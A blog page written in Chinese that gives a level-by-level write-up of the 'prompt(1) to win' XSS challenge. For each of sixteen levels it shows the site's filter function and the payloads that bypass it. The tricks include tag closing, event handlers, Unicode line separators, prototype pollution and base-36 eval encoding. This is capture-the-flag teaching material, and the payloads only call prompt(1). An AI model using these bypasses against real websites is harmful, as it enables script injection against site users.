@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>prompt(1) to win - Hannibal0x の Blog</title><meta name="Description" content="Hannibal0x的个人学习博客"><meta property="og:title" content="prompt(1) to win" />
+<meta property="og:description" content="http://prompt.ml 0x00 function escape(input) { // warm up // script should be executed without user interaction return &#39;&lt;input type=&#34;text&#34; value=&#34;&#39; &#43; input &#43; &#39;&#34;&gt;&#39;; } 简单闭合下，构造&quot;&gt;&lt;script&gt;prompt(1);&lt" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://hannibal0x.github.io/2021-03-31-prompt1-to-win/" /><meta property="og:image" content="https://hannibal0x.github.io/images/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-03-31T14:48:00+00:00" />
+<meta property="article:modified_time" content="2021-03-31T14:48:00+00:00" /><meta property="og:site_name" content="Hannibal0x の Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://hannibal0x.github.io/images/logo.png"/>
+
+<meta name="twitter:title" content="prompt(1) to win"/>
+<meta name="twitter:description" content="http://prompt.ml 0x00 function escape(input) { // warm up // script should be executed without user interaction return &#39;&lt;input type=&#34;text&#34; value=&#34;&#39; &#43; input &#43; &#39;&#34;&gt;&#39;; } 简单闭合下，构造&quot;&gt;&lt;script&gt;prompt(1);&lt"/>
+<meta name="application-name" content="Hannibal0x の Blog">
+<meta name="apple-mobile-web-app-title" content="Hannibal0x の Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/logo.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hannibal0x.github.io/2021-03-31-prompt1-to-win/" /><link rel="prev" href="https://hannibal0x.github.io/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/" /><link rel="next" href="https://hannibal0x.github.io/2021-04-04-xss-labs/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "prompt(1) to win",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/hannibal0x.github.io\/2021-03-31-prompt1-to-win\/"
+        },"genre": "posts","keywords": "Web安全, XSS","wordcount":  3864 ,
+        "url": "https:\/\/hannibal0x.github.io\/2021-03-31-prompt1-to-win\/","datePublished": "2021-03-31T14:48:00+00:00","dateModified": "2021-03-31T14:48:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Hannibal0x"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"><i class='fas fa-book'></i> 文章 </a><a class="menu-item" href="/tags/"><i class='fas fa-tags'></i> 标签 </a><a class="menu-item" href="/categories/"><i class='fas fa-folder'></i> 分类 </a><a class="menu-item" href="/categories/writeup"><i class='fas fa-flag'></i> CTF </a><a class="menu-item" href="/about/"><i class='fas fa-key'></i> 关于 </a><a class="menu-item" href="http://hannibal0x.top" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i> 旧博客 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title=""><i class='fas fa-book'></i>文章</a><a class="menu-item" href="/tags/" title=""><i class='fas fa-tags'></i>标签</a><a class="menu-item" href="/categories/" title=""><i class='fas fa-folder'></i>分类</a><a class="menu-item" href="/categories/writeup" title=""><i class='fas fa-flag'></i>CTF</a><a class="menu-item" href="/about/" title=""><i class='fas fa-key'></i>关于</a><a class="menu-item" href="http://hannibal0x.top" title="" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i>旧博客</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">prompt(1) to win</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Hannibal0x</a></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>安全技术</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-03-31">2021-03-31</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;3864 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;8 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00">0x00</a></li>
+    <li><a href="#0x01">0x01</a></li>
+    <li><a href="#0x02">0x02</a></li>
+    <li><a href="#0x03">0x03</a></li>
+    <li><a href="#0x04">0x04</a></li>
+    <li><a href="#0x05">0x05</a></li>
+    <li><a href="#0x06">0x06</a></li>
+    <li><a href="#0x07">0x07</a></li>
+    <li><a href="#0x08">0x08</a></li>
+    <li><a href="#0x09">0x09</a></li>
+    <li><a href="#0x0a">0x0A</a></li>
+    <li><a href="#0x0b">0x0B</a></li>
+    <li><a href="#0x0c">0x0C</a></li>
+    <li><a href="#0x0d">0x0D</a></li>
+    <li><a href="#0x0e">0x0E</a></li>
+    <li><a href="#0x0f">0x0F</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><a rel="noreferrer noopener" href="http://prompt.ml" target="_blank" rel="nofollow" ><a href="http://prompt.ml" target="_blank" rel="noopener noreffer ">http://prompt.ml</a></a></p>
+<div class="has-toc have-toc">
+</div>
+<h2 id="0x00">0x00</h2>
+<pre class="wp-block-code"><code>function escape(input) {
+    // warm up
+    // script should be executed without user interaction
+    return '&lt;input type="text" value="' + input + '">';
+}        </code></pre>
+<p>简单闭合下，构造<code>&quot;&gt;&lt;script&gt;prompt(1);&lt;/script&gt;</code></p>
+<h2 id="0x01">0x01</h2>
+<pre class="wp-block-code"><code>function escape(input) {
+    // tags stripping mechanism from ExtJS library
+    // Ext.util.Format.stripTags
+    var stripTagsRE = /&lt;\/?&#91;^>]+>/gi;
+    input = input.replace(stripTagsRE, '');
+
+    return '&lt;article>' + input + '&lt;/article>';
+}   </code></pre>
+<p>可以用换行或者注释绕过，构造<code>&lt;svg/onload=prompt(1)//</code><figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="471" height="145" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-176.png" alt="" class="wp-image-2922" /> </figure></p>
+<h2 id="0x02">0x02</h2>
+<pre class="wp-block-code"><code>function escape(input) {
+    //                      v-- frowny face
+    input = input.replace(/&#91;=(]/g, '');
+
+    // ok seriously, disallows equal signs and open parenthesis
+    return input;
+}  </code></pre>
+<p>可以构造如下的payload：</p>
+<pre class="wp-block-code"><code>&lt;script>eval.call`${'prompt\x281)'}`&lt;/script> 
+&lt;script>prompt.call`${1}`&lt;/script>
+&lt;svg>&lt;script>prompt&#40;1)&lt;/script>
+......</code></pre>
+<h2 id="0x03">0x03</h2>
+<pre class="wp-block-code"><code>function escape(input) {
+    // filter potential comment end delimiters
+    input = input.replace(/->/g, '_');
+
+    // comment the input to avoid script execution
+    return '&lt;!-- ' + input + ' -->';
+}    </code></pre>
+<p>绕过闭合注释，<code>--!&gt;&lt;svg/onload=prompt(1)&gt;</code></p>
+<h2 id="0x04">0x04</h2>
+<pre class="wp-block-code"><code>function escape(input) {
+    // make sure the script belongs to own site
+    // sample script: http://prompt.ml/js/test.js
+    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {
+        var script = document.createElement('script');
+        script.src = input;
+        return script.outerHTML;
+    } else {
+        return 'Invalid resource.';
+    }
+} </code></pre>
+<p>在本地将<code>prompt(1)</code>写入1.js，/ 是不允许的。考虑到这里的正则特性和decodeURIComponent函数，所以可以使用%2f绕过。最后构造<code>http://prompt.ml/@localhost/1.js</code></p>
+<h2 id="0x05">0x05</h2>
+<pre class="wp-block-code"><code>function escape(input) {
+    // apply strict filter rules of level 0
+    // filter ">" and event handlers
+    input = input.replace(/>|on.+?=|focus/gi, '_');
+
+    return '&lt;input value="' + input + '" type="text">';
+}   </code></pre>
+<p>构造如下payload</p>
+<pre class="wp-block-code"><code>" type="image" src=# onerror
+=prompt(1) "</code></pre>
+<h2 id="0x06">0x06</h2>
+<pre class="wp-block-code"><code>function escape(input) {
+    // let's do a post redirection
+    try {
+        // pass in formURL#formDataJSON
+        // e.g. http://httpbin.org/post#{"name":"Matt"}
+        var segments = input.split('#');
+        var formURL = segments&#91;0];
+        var formData = JSON.parse(segments&#91;1]);
+
+        var form = document.createElement('form');
+        form.action = formURL;
+        form.method = 'post';
+    
+        for (var i in formData) {
+            var input = form.appendChild(document.createElement('input'));
+            input.name = i;
+            input.setAttribute('value', formData&#91;i]);
+        }
+    
+        return form.outerHTML + '                         \n\
+&lt;script>                                                  \n\
+    // forbid javascript: or vbscript: and data: stuff    \n\
+    if (!/script:|data:/i.test(document.forms&#91;0].action)) \n\
+        document.forms&#91;0].submit();                       \n\
+    else                                                  \n\
+        document.write("Action forbidden.")               \n\
+&lt;/script>                                                 \n\
+        ';
+    } catch (e) {
+        return 'Invalid form data.';
+    }
+}  </code></pre>
+<p>先输入范例，查看下效果<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="933" height="410" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-177.png" alt="" class="wp-image-2927" /> </figure></p>
+<p>这道题是考察表单提交action过滤，这里参考大佬们的答案进行整理。题目构造post表单，我们需要输入的格式为formURL#formDataJSON，具体过程是先提取formURL构造form表单，formURL赋值给form标签中的action，然后post内容构造input标签。</p>
+<p>想嵌入代码，经常能见到类似action=”javascript:alert(1)”的内容，但是后面还过滤了document.form[0].action内容，过滤了script和data字符。</p>
+<p>但是过滤存在缺陷，由于存在子级tag，action 将会优先指向name为action的子tag。所以我们在构造payload时，可以将input标签的name属性值设置为action，这样document.form[0].action指向的就不是form标签中的action了，因此过滤也就不起作用了。payload：<code>javascript:prompt(1)#{&quot;action&quot;:&quot;Matt&quot;}</code></p>
+<h2 id="0x07">0x07</h2>
+<pre class="wp-block-code"><code>function escape(input) {
+    // pass in something like dog#cat#bird#mouse...
+    var segments = input.split('#');
+    return segments.map(function(title) {
+        // title can only contain 12 characters
+        return '&lt;p class="comment" title="' + title.slice(0, 12) + '">&lt;/p>';
+    }).join('\n');
+}        </code></pre>
+<p>字符按照#分离，每一部分赋给一个<code>title</code>，如果超过12字符，就截取前12个。可以使用注释绕过长度限制,:</p>
+<pre class="wp-block-code"><code>">&lt;script>/*#*/prompt(1/*#*/)&lt;/script>
+
+">&lt;svg/a=#"onload='/*#*/prompt(1)'</code></pre>
+<h2 id="0x08">0x08</h2>
+<pre class="wp-block-code"><code>function escape(input) {
+    // prevent input from getting out of comment
+    // strip off line-breaks and stuff
+    input = input.replace(/&#91;\r\n&lt;/"]/g, '');
+
+    return '                                \n\
+&lt;script>                                    \n\
+    // console.log("' + input + '");        \n\
+&lt;/script> ';
+}        </code></pre>
+<p>过滤了两个换行符，所以需要一个特殊的编码技巧：</p>
+<pre class="wp-block-code"><code>U+2028，是Unicode中的行分隔符。
+U+2029，是Unicode中的段落分隔符。
+--> 在 js 中可当注释使用</code></pre>
+<p>在console中输入：<code>'\u2028prompt(1)\u2028--&gt;'</code>或者 <code>'\u2029prompt(1)\u2029--&gt;'</code> 输出的结果就是payload。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="363" height="108" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-178.png" alt="" class="wp-image-2935" /> </figure></p>
+<h2 id="0x09">0x09</h2>
+<pre class="wp-block-code"><code>function escape(input) {
+    // filter potential start-tags
+    input = input.replace(/&lt;(&#91;a-zA-Z])/g, '&lt;_$1');
+    // use all-caps for heading
+    input = input.toUpperCase();
+
+    // sample input: you shall not pass! => YOU SHALL NOT PASS!
+    return '&lt;h1>' + input + '&lt;/h1>';
+}    </code></pre>
+<p>思路之前在XSS弹窗挑战里说过，给个payload，<code>&lt;ſcript/src=&quot;http://127.0.0.1/1.js&quot;&gt;</code></p>
+<h2 id="0x0a">0x0A</h2>
+<pre class="wp-block-code"><code>function escape(input) {
+    // (╯°□°）╯︵ ┻━┻
+    input = encodeURIComponent(input).replace(/prompt/g, 'alert');
+    // ┬──┬ ノ( ゜-゜ノ) chill out bro
+    input = input.replace(/'/g, '');
+
+    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
+    return '&lt;script>' + input + '&lt;/script> ';
+}      </code></pre>
+<p>encodeURIComponent()不会对 ASCII 字母和数字进行编码，也不会对这些 ASCII 标点符号进行编码： - _ . ! ~ * &rsquo; ( ) 。其他字符（比如：;/?:@&amp;=+$,# 这些用于分隔 URI 组件的标点符号），都是由一个或多个十六进制的转义序列替换的。且过滤单引号，可以考虑构造<code>p'rompt(1)</code></p>
+<h2 id="0x0b">0x0B</h2>
+<pre class="wp-block-code"><code>function escape(input) {
+    // name should not contain special characters
+    var memberName = input.replace(/&#91;&#91;|\s+*/\\&lt;>&^:;=~!%-]/g, '');
+
+    // data to be parsed as JSON
+    var dataString = '{"action":"login","message":"Welcome back, ' + memberName + '."}';
+    
+    // directly "parse" data in script context
+    return '                                \n\
+&lt;script>                                    \n\
+    var data = ' + dataString + ';          \n\
+    if (data.action === "login")            \n\
+        document.write(data.message)        \n\
+&lt;/script> ';
+}     </code></pre>
+<p>在js中，<code>(prompt(1))instanceof&quot;1&quot;</code>和 <code>(prompt(1))in&quot;1&quot;</code> 是可以成功弹窗的，其中双引号里面的1可以是任何字符，这里的in或者instanceof是运算符，所以可以有这样的语法结构。</p>
+<pre class="wp-block-code"><code>"(prompt(1))in"
+"(prompt(1))instanceof"</code></pre>
+<p>补充一个知识点，<code>&quot;1&quot;(alert(1))</code>虽然会提示语法错误， 但是还是会执行js语句弹框。(和浏览器有关)</p>
+<h2 id="0x0c">0x0C</h2>
+<pre class="wp-block-code"><code>function escape(input) {
+    // in Soviet Russia...
+    input = encodeURIComponent(input).replace(/'/g, '');
+    // table flips you!
+    input = input.replace(/prompt/g, 'alert');
+
+    // ノ┬─┬ノ ︵ ( \o°o)\
+    return '&lt;script>' + input + '&lt;/script> ';
+}        </code></pre>
+<p><code>parseInt()</code>可以将字符串转数字，语法<code>parseInt(&lt;em&gt;string&lt;/em&gt;, &lt;em&gt;radix&lt;/em&gt;)</code>。</p>
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>string</td>
+<td>必需。要被解析的字符串。</td>
+</tr>
+<tr>
+<td>radix</td>
+<td>可选。表示要解析的数字的基数。该值介于 2 ~ 36 之间。 如果省略该参数或其值为 0，则数字将以 10 为基础来解析。如果它以 “0x” 或 “0X” 开头，将以 16 为基数。 如果该参数小于 2 或者大于 36，则 parseInt() 将返回 NaN。</td>
+</tr>
+</tbody>
+</table>
+<p><code>toString()</code>也有一个可选参数radix，找一个足够大的基数来包含所需的所有字符，就可以将字符串编码为一个数字，然后<code>eval</code>转换的结果（数字&gt;字符串）。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="245" height="100" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-179.png" alt="" class="wp-image-2945" /> </figure></p>
+<p>可以构造如下payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">eval((1558153217).toString(36))(1)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">eval((1172936279).toString(34).concat(String.fromCharCode(40)).concat(1).concat(String.fromCharCode(41)))
+</span></span><span class="line"><span class="cl">解释:concat连接，String.fromCharCode(40)-&gt;(， String.fromCharCode(41)-&gt;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">eval((25).toString(30).concat(String.fromCharCode(114)).concat(String.fromCharCode(111)).concat(String.fromCharCode(109)).concat(String.fromCharCode(112)).concat(String.fromCharCode(116)).concat(String.fromCharCode(40)).concat(1).concat(String.fromCharCode(41)))
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x0d">0x0D</h2>
+<pre class="wp-block-code"><code> function escape(input) {
+    // extend method from Underscore library
+    // _.extend(destination, *sources) 
+    function extend(obj) {
+        var source, prop;
+        for (var i = 1, length = arguments.length; i &lt; length; i++) {
+            source = arguments&#91;i];
+            for (prop in source) {
+                obj&#91;prop] = source&#91;prop];
+            }
+        }
+        return obj;
+    }
+    // a simple picture plugin
+    try {
+        // pass in something like {"source":"http://sandbox.prompt.ml/PROMPT.JPG"}
+        var data = JSON.parse(input);
+        var config = extend({
+            // default image source
+            source: 'http://placehold.it/350x150'
+        }, JSON.parse(input));
+        // forbit invalid image source
+        if (/&#91;^\w:\/.]/.test(config.source)) {
+            delete config.source;
+        }
+        // purify the source by stripping off "
+        var source = config.source.replace(/"/g, '');
+        // insert the content using mustache-ish template
+        return '&lt;img src="{{source}}">'.replace('{{source}}', source);
+    } catch (e) {
+        return 'Invalid image data.';
+    }
+}    </code></pre>
+<p>我太菜了，这题没有思路解，看了下大佬的博客，现在复现下。JSON.parse()函数要接受一个json格式的字符串返回json格式的对象，如果传入的参数已经是json格式则会抛出异常，传入的参数被解析成json格式，格式不对则直接返回Invalid image data.，再经由extend()函数处理，extend()函数把默认值替换为指定的值后返回，然后是一个正则判断source对应的值中是否有不属于url的符号，有则删去这个值，将source属性删除。</p>
+<p>每个对象都会在其内部初始化一个属性，就是proto，当我们访问对象的属性时，如果对象内部不存在这个属性，那么就会去proto里面找这个属性。</p>
+<p>原理测试<code>test={&quot;source&quot;:1,&quot;__proto__&quot;:{&quot;source&quot;:2}}</code>：<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="346" height="204" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-181.png" alt="" class="wp-image-2949" /> </figure></p>
+<p>那么基本上就是构造<code>{&quot;source&quot;:&quot;'&quot;,&quot;proto&quot;:{&quot;source&quot;:&quot;onerror=prompt(1)&quot;}}</code>,由于前面有非法字符&rsquo;，则会删除，但是在替换的时候由于过滤了&quot;,无法闭合，那么需要利用replace的一个特性。<figure class="wp-block-image"></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://xzfile.aliyuncs.com/media/upload/picture/20190326141703-c618e428-4f8e-1.jpg"
+        data-srcset="https://xzfile.aliyuncs.com/media/upload/picture/20190326141703-c618e428-4f8e-1.jpg, https://xzfile.aliyuncs.com/media/upload/picture/20190326141703-c618e428-4f8e-1.jpg 1.5x, https://xzfile.aliyuncs.com/media/upload/picture/20190326141703-c618e428-4f8e-1.jpg 2x"
+        data-sizes="auto"
+        alt="https://xzfile.aliyuncs.com/media/upload/picture/20190326141703-c618e428-4f8e-1.jpg"
+        title="https://xzfile.aliyuncs.com/media/upload/picture/20190326141703-c618e428-4f8e-1.jpg" /> </figure></p>
+<pre class="wp-block-code"><code>'1234567890'.replace('3',"han")
+"12han4567890"
+
+'1234567890'.replace('3',"$&han")
+"123han4567890"
+
+'1234567890'.replace('3',"$`han")
+"1212han4567890"
+
+'1234567890'.replace('3',"$'han")
+"124567890han4567890"
+
+'1234567890'.replace('3',"$$han")
+"12$han4567890"</code></pre>
+<p>最后构造payload<code>{&quot;source&quot;:&quot;'&quot;,&quot; proto&quot;: {&quot;source&quot;:&quot;$`onerror=prompt(1)&gt;&quot;}}</code></p>
+<h2 id="0x0e">0x0E</h2>
+<pre class="wp-block-code"><code>function escape(input) {
+    // I expect this one will have other solutions, so be creative :)
+    // mspaint makes all file names in all-caps :(
+    // too lazy to convert them back in lower case
+    // sample input: prompt.jpg => PROMPT.JPG
+    input = input.toUpperCase();
+    // only allows images loaded from own host or data URI scheme
+    input = input.replace(/\/\/|\w+:/g, 'data:');
+    // miscellaneous filtering
+    input = input.replace(/&#91;\\&+%\s]|vbs/gi, '_');
+
+    return '&lt;img src="' + input + '">';
+}  </code></pre>
+<p>函数先把输入转换为大写，第二层将//和字母换为data:，第三层将\、&amp;、+、%和空白字符，vbs替换为_，所以不能内嵌编码后的字符，由于js大小写敏感，所以只能引用外部脚本。</p>
+<p>Data URI是由RFC 2397定义的一种把小文件直接嵌入文档的方案。格式如下：</p>
+<pre class="wp-block-code"><code>data:&#91;&lt;MIME type>]&#91;;charset=&lt;charset>]&#91;;base64],&lt;encoded data></code></pre>
+<p>其实整体可以视为三部分，即声明：参数+数据，逗号左边的是各种参数，右边的是数据。</p>
+<p>MIME type，表示数据呈现的格式，即指定嵌入数据的MIME。</p>
+<ul>
+<li>1、对于PNG的图片，其格式是image/png，如果没有指定，默认是text/plain。</li>
+<li>2、character set(字符集）大多数被忽略，默认是charset=US-ASCII。如果指定是的数据格式是图片时，字符集将不再使用。</li>
+<li>3、base64，这一部分将表明其数据的编码方式，此处为声明后面的数据的编码是base64，我们可以不必使用base64编码格式，如果那样，我们将使用标准的URL编码方式,形如%XX%XX%XX的格式。</li>
+</ul>
+<p>一个data URI范例：</p>
+<pre class="wp-block-code"><code>&lt;a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4="&gt;test&lt;a&gt;</code></pre>
+<p>这道题目有问题，并不能复现成功，参考payload：<code>&quot;&gt;&lt;IFRAME/SRC=&quot;x:text/html;base64,ICA8U0NSSVBUIC8KU1JDCSA9SFRUUFM6UE1UMS5NTD4JPC9TQ1JJUFQJPD4=</code></p>
+<h2 id="0x0f">0x0F</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">function escape(input) {
+</span></span><span class="line"><span class="cl">    // sort of spoiler of level 7
+</span></span><span class="line"><span class="cl">    input = input.replace(/\*/g, &#39;&#39;);
+</span></span><span class="line"><span class="cl">    // pass in something like dog#cat#bird#mouse...
+</span></span><span class="line"><span class="cl">    var segments = input.split(&#39;#&#39;);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    return segments.map(function(title, index) {
+</span></span><span class="line"><span class="cl">        // title can only contain 15 characters
+</span></span><span class="line"><span class="cl">        return &#39;&lt;p class=&#34;comment&#34; title=&#34;&#39; + title.slice(0, 15) + &#39;&#34; data-comment=\&#39;{&#34;id&#34;:&#39;
+</span></span><span class="line"><span class="cl">        + index + &#39;}\&#39;&gt;&lt;/p&gt;&#39;;
+</span></span><span class="line"><span class="cl">    }).join(&#39;\n&#39;);
+</span></span><span class="line"><span class="cl">}  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>7的加强版，会过滤掉*。可以用<code>&lt;svg&gt;</code>标签构造关于&lt;!-&mdash;&gt;的注释。</p>
+<pre class="wp-block-code"><code>">&lt;svg>&lt;!--#-->&lt;script>&lt;!--#-->prompt(1&lt;!--#-->)&lt;/script>
+
+">&lt;svg>&lt;!--#-->&lt;script>&lt;!--#-->prompt(1)&lt;/</code></pre>
+<p>模板字符串 知识点：<br>
+1.反撇号字符 ` 代替普通字符串的引号 &rsquo; 或 &ldquo;，提供了字符串插值功能。<br>
+2.<code>${x}</code>被称为模板占位符，JavaScript 将把 x 的值插入到最终生成的字符串中，也就是说`abcd${alert(1)}efgh`是可以正常执行的。</p>
+<pre class="wp-block-code"><code>">&lt;script>`#${prompt(1)}#`&lt;/script></code></pre>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-03-31</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/2021-03-31-prompt1-to-win/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
